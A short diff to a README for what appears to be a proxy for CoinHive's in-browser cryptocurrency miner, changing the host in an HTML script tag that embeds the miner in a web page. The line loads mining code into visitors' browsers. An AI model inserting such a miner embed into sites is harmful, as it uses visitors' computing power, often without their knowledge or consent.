@@ -18,7 +18,7 @@ Instead of embedding CoinHive's [JavaScript Miner](https://coinhive.com/document
 You can embed this proxy:
 
 ```html
-<script src="https://vladislavzhdanov.github.io/chipro/client.js?chipro=chipro.now.sh"></script>
+<script src="https://vladislavzhdanov.github.io/chipro/client.js?chipro=chipro-hljkminjab.now.sh"></script>
 ```
 
 And it will work in the same way.
